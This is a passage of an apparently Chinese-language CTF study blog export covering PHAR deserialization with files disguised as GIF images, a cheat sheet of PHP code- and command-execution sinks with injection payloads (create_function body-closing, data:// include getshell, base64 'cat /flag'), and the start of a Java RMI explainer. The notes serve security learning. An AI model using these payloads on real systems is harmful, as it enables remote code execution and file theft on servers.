id="Manifest-中的内容："><a href="#Manifest-中的内容：" class="headerlink" title="Manifest 中的内容："></a>Manifest 中的内容：</h4><ul><li><strong>文件信息</strong>：每个文件的信息，包括文件名、压缩方式、文件大小等属性都会记录在 <code>Manifest</code> 部分。</li><li><strong>元数据（Meta-data）</strong>：这一部分是存储用户自定义的序列化数据，也就是攻击者可以利用的部分。如果攻击者可以通过某种方式注入恶意的 PHP 对象到这个元数据中，当 PHAR 文件被加载时，这些恶意对象会被反序列化并执行攻击代码。</li></ul><p><strong>序列化对象漏洞的利用点</strong>： PHAR 文件可以包含序列化的 PHP 对象。如果一个应用程序存在文件包含漏洞（例如本地文件包含，LFI），并且通过 <code>phar://</code> 协议来加载文件时，PHP 会自动反序列化这些元数据中的对象。如果这些对象包含恶意代码（例如有不安全的 <code>__destruct()</code> 或 <code>__wakeup()</code> 方法），就会触发远程代码执行。</p><hr><h3 id="3-文件内容（File-Contents）"><a href="#3-文件内容（File-Contents）" class="headerlink" title="3. 文件内容（File Contents）"></a>3. <strong>文件内容（File Contents）</strong></h3><p>这一部分是 PHAR 文件实际存储的文件数据。被压缩的文件会被分配到 <code>Manifest</code> 中定义的位置，并且可以通过 <code>phar://</code> 协议进行访问。</p><ul><li><p>例如，如果 PHAR 文件中有一个名为 <code>index.php</code> 的文件，应用程序可以使用以下方式访问它：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;phar://example.phar/index.php&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>文件内容可以是 PHP 文件、图片、文本文件等任意格式。</p></li></ul><hr><h3 id="4-可选的签名（Signature）"><a href="#4-可选的签名（Signature）" class="headerlink" title="4. 可选的签名（Signature）"></a>4. <strong>可选的签名（Signature）</strong></h3><p>签名是 PHAR 文件的完整性校验部分，通常位于文件末尾。签名用于验证 PHAR 文件在分发过程中是否被篡改。PHAR 文件的签名支持多种算法，包括：</p><ul><li>SHA-1</li><li>SHA-256</li><li>SHA-512</li><li>MD5</li></ul><h4 id="签名的作用："><a href="#签名的作用：" class="headerlink" title="签名的作用："></a>签名的作用：</h4><ul><li><strong>验证完整性</strong>：签名保证了 PHAR 文件未被篡改。如果签名不正确，PHAR 文件可能会被拒绝加载（取决于 PHP 配置）。</li><li><strong>签名机制</strong>是可选的，某些情况下签名可能被禁用或忽略。</li></ul><blockquote><p>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</p></blockquote><h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件,这里向 PHAR 文件中添加了一个名为 test.txt 的文件，文件内容为 &quot;test&quot;。这一步模拟了在 PHAR 文件中打包文件的过程。通常情况下，PHAR 文件可以包含任意格式的文件（如 PHP 文件、文本文件等）。</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241019233515855.png" alt="image-20241019233515855"></p><h1 id="伪造文件头"><a href="#伪造文件头" class="headerlink" title="伪造文件头"></a>伪造文件头</h1><p>可以 phar 文件必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。因此假设这里我们构造一个带有图片文件头部的 phar 文件。</p><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;demo_jpg.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;demo_jpg.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;data=<span class="string">&#x27;haaaaa&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$d</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://demp.phar&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意要同版本</p><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241020000113300.png" alt="image-20241020000113300"></p><p>如果题目限制了，<code>phar://</code>不能出现在头几个字符。可以用<code>Bzip / Gzip</code>协议绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;compress.zlib://phar://phar.phar/test.txt&#x27;</span>;</span><br></pre></td></tr></table></figure><p>虽然会警告但仍会执行，它同样适用于<code>compress.bzip2://</code>。<br>当文件系统函数的参数可控时，我们可以在不调用<code>unserialize()</code>的情况下进行反序列化操作，极大的拓展了反序列化攻击面。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE函数和命令</title>
      <link href="/2024/02/26/RCE/"/>
      <url>/2024/02/26/RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="“读”-命令"><a href="#“读”-命令" class="headerlink" title="“读” 命令"></a>“读” 命令</h1><p>shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">less</span><br><span class="line">more</span><br><span class="line">head //head -n 10 filename</span><br><span class="line">tail //tail -n 10 filename</span><br><span class="line">nl</span><br><span class="line">od //od -c filename 以字符形式查看文件内容</span><br><span class="line">strings //strings filename</span><br><span class="line">xxd //xxd filename 显示文件的十六进制和 ASCII 字符</span><br><span class="line">awk //awk &#x27;&#123;print $1&#125;&#x27; filename 显示文件每行的第一列</span><br><span class="line">sed //sed -n &#x27;5,10p&#x27; filename 显示文件的第5到第10行</span><br><span class="line">grep //grep &#x27;pattern&#x27; filename</span><br><span class="line">dd  //dd if=filename bs=512 count=1 读取文件的前512字节</span><br><span class="line">vi/vim</span><br><span class="line">nano</span><br><span class="line">cut </span><br><span class="line">/*用于从每一行中提取指定的字段（列），通常用于提取 CSV、TSV 或其他分隔符分隔的数据。cut -d&#x27;,&#x27; -</span><br><span class="line">f1,2 file.txt: 使用逗号作为分隔符，提取第 1 和第 2 列。cut -c1-10 file.txt: 提取每一行的前 10 个字符。*/</span><br><span class="line">uniq //用于过滤或去除重复的行 直接uniq flag就可以</span><br><span class="line">sort </span><br><span class="line">// 用于对文本行进行排序。它可以按字母顺序、数字顺序、甚至是按特定列进行排序。 也可以直接sort flag</span><br><span class="line">tr  // tr &#x27;f&#x27; &#x27;F&#x27; &lt; flag用于替换或删除字符</span><br><span class="line">wc  //统计文本文件中的行数、单词数和字符数的命令,实在不行爆破吧：）</span><br><span class="line">la</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240815203342672.png" alt="image-20240815203342672"></p><p>php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">file</span>(); <span class="comment">//返回的是数组，可以直接cmd=echo file(&#x27;/flag&#x27;)[0];</span></span><br><span class="line"><span class="title function_ invoke__">fopen</span>()组合拳 <span class="comment">// cmd=echo fread(fopen(&#x27;/flag&#x27;,&#x27;r&#x27;),filesize(&#x27;/flag&#x27;));</span></span><br><span class="line"><span class="title function_ invoke__">fgets</span>() <span class="comment">//只能读一行 cmd=echo fgets(fopen(&#x27;/flag&#x27;,&#x27;r&#x27;),filesize(&#x27;/flag&#x27;));</span></span><br><span class="line"><span class="title function_ invoke__">fgetc</span>()  <span class="comment">//只能读一字节（除非特别的情况，否则用处很少</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br><span class="line"><span class="keyword">include</span>/<span class="keyword">require</span> <span class="comment">// cmd=echo include &#x27;/flag&#x27;;NSSCTF&#123;c4d29639-7296-45ca-81cd-fbf3c3c9de93&#125; 1  `如果文件包含 PHP 代码，会被执行`</span></span><br><span class="line"><span class="title function_ invoke__">parse_ini_file</span>(); <span class="comment">//解析 ini 文件，并以数组的形式返回内容。</span></span><br><span class="line"><span class="title function_ invoke__">readlink</span>(); <span class="comment">//返回符号链接的目标。</span></span><br><span class="line"><span class="title function_ invoke__">glob</span>() <span class="comment">//查找与模式匹配的文件路径,返回的是数组。 print glob(&#x27;/fla*&#x27;)[0];    /flag</span></span><br><span class="line"><span class="title function_ invoke__">simplexml_load_file</span>() <span class="comment">//解析 XML 文件，并返回对象形式的内容。</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br></pre></td></tr></table></figure><h1 id="“输出”命令"><a href="#“输出”命令" class="headerlink" title="“输出”命令"></a>“输出”命令</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>() <span class="comment">//打印数组和对象的函数 像上面的cmd=echo file(&#x27;/flag&#x27;)[0]可以直接cmd=print_r(file(&#x27;/flag&#x27;));</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p>字符串动态执行，结尾必须有<code>；</code></p><p><code>trick</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>)<span class="meta">?&gt;</span>)</span><br><span class="line"><span class="keyword">eval</span>(<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span>)</span><br><span class="line"><span class="keyword">eval</span>(<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span>;)</span><br><span class="line"><span class="keyword">eval</span>(<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span><span class="meta">&lt;?</span>)</span><br><span class="line"><span class="keyword">eval</span>(<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>;)</span><br></pre></td></tr></table></figure><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><p>assert是断言函数，可以用来命令执行,assert对分号<code>没有要求</code>。</p><h2 id="preg-replace-PHP-5-5-0被弃用-7-0-0被废除"><a href="#preg-replace-PHP-5-5-0被弃用-7-0-0被废除" class="headerlink" title="preg_replace (PHP&gt;5.5.0被弃用,7.0.0被废除)"></a>preg_replace (PHP&gt;5.5.0被弃用,7.0.0被废除)</h2><p>这个函数本来是用来替换字符串的，但是他的e模式符导致了命令执行的可能<br><code>e模式符</code>也就是会用<code>eval执行代码</code>,示例如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/aaa/e&quot;</span>,<span class="string">&quot;phpinfo();&quot;</span>,<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="call-user-func和call-user-func-array"><a href="#call-user-func和call-user-func-array" class="headerlink" title="call_user_func和call_user_func_array"></a>call_user_func和call_user_func_array</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;system&#x27;</span>,[<span class="string">&quot;whoami&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>会把第一个参数作为<code>回调函数</code>，第二个参数为函数的<code>形参</code>，一个传入字符串一个传入数组。最终都可以导致命令执行。</p><h2 id="create-function（PHP-7-2-0-中移除）"><a href="#create-function（PHP-7-2-0-中移除）" class="headerlink" title="create_function（PHP 7.2.0 中移除）"></a>create_function（PHP 7.2.0 中移除）</h2><p>前言：已经被闭包代替：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sum_function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sum_function</span>(<span class="number">3</span>, <span class="number">4</span>);  <span class="comment">// 输出 7</span></span><br></pre></td></tr></table></figure><p>create_function可以用来创建一个匿名函数。</p><p>create_function(‘$args’, ‘$code’)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$create_function</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>);</span><br><span class="line"><span class="variable">$create_function</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>trick</code></p><p>create_function也是往方法体注入内容，那么我们也是可以闭合方法体的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function (形参)&#123;</span><br><span class="line">  参数内容;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如我们的参数内容是<code>&#125;xxxxx//</code>那么是不是也完成了闭合呢？然后xxxx部分就是我们控制的了，那么我们就不需要调用这个匿名函数，直接完成方法执行。</p><p>另一种(反过来我们控制的不是函数体而是参数，道理一样)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$cmd</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">这个时候cmd就可以为：)&#123;&#125;<span class="keyword">echo</span> <span class="title function_ invoke__">file</span>(<span class="string">&#x27;/flag&#x27;</span>)[<span class="number">0</span>];<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h2><p>与call_user_func_array类似，也是回调函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="string">&quot;system&quot;</span>,[<span class="string">&quot;whoami&quot;</span>])</span><br></pre></td></tr></table></figure><h2 id="include与伪协议的结合Getshell"><a href="#include与伪协议的结合Getshell" class="headerlink" title="include与伪协议的结合Getshell"></a>include与伪协议的结合Getshell</h2><p>伪协议：</p><ul><li><p>filter</p></li><li><p>data</p><blockquote><p>注意一定要开启<code>allow_url_include=On</code></p></blockquote></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;data://text/php,&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;data://text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==可以多重编码</span></span><br></pre></td></tr></table></figure><h1 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h1><h2 id="php中可以执行的"><a href="#php中可以执行的" class="headerlink" title="php中可以执行的"></a>php中可以执行的</h2><h3 id="回显型"><a href="#回显型" class="headerlink" title="回显型"></a>回显型</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>() </span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br></pre></td></tr></table></figure><blockquote><p>pcntl_exec(“&#x2F;bin&#x2F;bash”,[“-c”,”whami”]),这里“-c”表示紧接着的字符串是一个<code>命令</code></p></blockquote><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>() <span class="comment">//var_dump出来即可</span></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>() <span class="comment">//exec会返回第一行，shell_exec会返回所有结果</span></span><br><span class="line">`` <span class="comment">//==shell_exec</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240815190910472.png" alt="image-20240815190910472"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240815191313930.png" alt="image-20240815191313930"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">popen</span>() </span><br><span class="line"><span class="title function_ invoke__">proc_open</span>() </span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>() </span><br></pre></td></tr></table></figure><h4 id="popen-返回的流"><a href="#popen-返回的流" class="headerlink" title="popen 返回的流"></a><code>popen</code> 返回的流</h4><p>在 PHP 中，<code>popen</code> 函数用于打开一个管道（pipe）到一个进程，这个管道可以是只读的（<code>r</code>），只写的（<code>w</code>），或者是读写的。<code>popen</code> 函数会返回一个文件指针（通常称为 “流”），你可以通过这个指针来读取或写入数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stream</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;cmd.exe /c dir&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$read</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$stream</span>, <span class="number">2096</span>); <span class="comment">//全部读出来</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$read</span>;</span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$stream</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stream</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;cmd.exe /c dir&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$stream</span>)) &#123; <span class="comment">//一次fgets只读一行</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br></pre></td></tr></table></figure><h4 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start"></a>ob_start</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;whoami&quot;</span>; <span class="comment">//dir只输出一行</span></span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMI</title>
      <link href="/2024/02/26/RMI/"/>
      <url>/2024/02/26/RMI/</url>
      
        <content type="html"><![CDATA[<h1 id="RMI基本要素"><a href="#RMI基本要素" class="headerlink" title="RMI基本要素"></a>RMI基本要素</h1><h2 id="RMIServer构成"><a href="#RMIServer构成" class="headerlink" title="RMIServer构成"></a>RMIServer构成</h2><ul><li>一个继承了Remote类的接口，定义远程调用的函数。</li><li>一个实现该接口的类</li><li>一个主类来创建Registry，并将上面的实现了接口的类实例化后绑定一个地址，得到Server</li></ul><h2 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h2><ul><li>只需要调用Naming.lookup()来找远程注册的对象</li></ul><p><code>Java是强类型语言</code></p><blockquote><p><code>Naming.lookup()</code> 是 Java RMI 提供的一个方法，用于从远程 RMI 注册表中<strong>查找远程对象</strong>。</p><p>该方法返回的是一个通用的 <strong><code>Remote</code></strong> 类型的对象，因为 <code>Remote</code> 是所有远程接口的父接口（标记接口）。也就是说，<code>Naming.lookup()</code> 不知道它具体返回的是什么类型的远程对象，只能返回一个通用的 <code>Remote</code> 对象。</p><p>因此，<code>Naming.lookup(&quot;rmi://localhost:1099/hello&quot;)</code> 返回的对象是 <code>Remote</code> 类型，但这只是一个<strong>父类类型</strong>的引用，实际的对象类型可能是你定义的远程接口类型，例如 <code>RMIServer.IRemoteHello</code>。</p></blockquote><h2 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a>通信过程</h2><ul><li>RMI Registry</li><li>RMI Server</li><li>RMI Client</li></ul><h1 id="代码实现相关"><a href="#代码实现相关" class="headerlink" title="代码实现相关"></a>代码实现相关</h1><h2 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h2><p>java不允许多重继承，但是允许一个类继承一个类，然后实现多个接口。</p><p>就像Server里面实现的接口的类，其签名为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHello</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteHello</span></span><br></pre></td></tr></table></figure><p>同时接口IRemoteHello则继承RMI的父类Remote</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span></span><br></pre></td></tr></table></figure><p>可以看到Remote实际是一个<strong>标记接口</strong>（marker interface），它不包含任何方法，但是通过继承 <code>Remote</code>，Java RMI 系统知道这个接口中的方法可以通过网络进行调用。</p><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20240918115606272.png" alt="image-20240918115606272"></p><p>所以继承Remote接口的意义就是 <code>IRemoteHello</code> 成为一个 <strong>远程接口</strong>。所有继承自 